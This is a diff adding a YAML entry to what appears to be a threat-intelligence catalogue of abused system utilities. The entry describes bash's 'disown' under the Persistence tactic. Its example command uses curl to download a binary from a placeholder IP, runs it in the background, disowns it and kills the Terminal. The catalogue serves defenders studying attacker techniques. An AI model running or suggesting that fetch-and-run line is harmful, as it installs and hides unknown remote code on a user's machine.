@@ -1,0 +1,25 @@
+name: disown
+author: Gabriel De Jesus (0xv1n)
+short_description: Prevents a process from being terminated when a shell session or terminal is closed.
+full_description: disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.
+created: 2025-05-27
+example_use_cases:
+  - name: Start a process and remove it from the jobs table.
+    description: The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session.
+    code: curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal
+    tactics:
+      - Persistence
+    tags:
+      - bash
+paths:
+  - shell built-in command (bash)
+detections:
+  - name: No detection content at time of writing
+    url: N/A
+resources:
+  - name: disown man page
+    url: https://linux.die.net/man/1/disown
+  - name: bash man page
+    url: https://man7.org/linux/man-pages/man1/bash.1.html
+  - name: Poseidon Stealer
+    url: https://www.esentire.com/blog/poseidon-stealer-uses-sora-ai-lure-to-infect-macos
